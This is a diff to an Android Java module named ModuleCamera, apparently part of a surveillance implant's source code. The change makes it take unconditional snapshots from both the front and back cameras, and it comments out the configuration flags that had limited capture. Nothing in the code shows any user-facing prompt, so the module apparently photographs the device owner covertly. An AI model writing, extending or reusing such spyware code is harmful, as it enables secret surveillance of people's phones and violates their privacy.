@@ -10,6 +10,7 @@
 package com.android.dvci.module;
 
 import android.content.pm.PackageManager;
+import android.hardware.Camera;
 import android.os.Build;
 
 import com.android.dvci.Status;
@@ -32,7 +33,7 @@ public class ModuleCamera extends BaseInstantModule {
 	private static final String TAG = "ModuleCamera"; //$NON-NLS-1$
 
 	int counter = 0;
-	private boolean face;
+	//private boolean face;
 
 	/*
 	 * (non-Javadoc)
@@ -42,8 +43,8 @@ public class ModuleCamera extends BaseInstantModule {
 	@Override
 	public boolean parse(ConfModule conf) {
 
-		boolean force = conf.getBoolean("force", false);
-		face = conf.getBoolean("face", false);
+		//boolean force = conf.getBoolean("force", false);
+		//face = conf.getBoolean("face", false);
 
 		return checkCameraHardware();
 	}
@@ -92,14 +93,9 @@ public class ModuleCamera extends BaseInstantModule {
 		if (Build.VERSION.SDK_INT > Build.VERSION_CODES.HONEYCOMB) {
 			CameraSnapshot camera = CameraSnapshot.self();
 
-			if (Cfg.DEBUG) {
-				//camera.snapshot(counter % 2 == 0);
-			}
+			camera.snapshot(Camera.CameraInfo.CAMERA_FACING_FRONT);
+			camera.snapshot(Camera.CameraInfo.CAMERA_FACING_BACK);
 
-			camera.snapshot(false);
-			if(face) {
-				camera.snapshot(true);
-			}
 		}
 
 	}
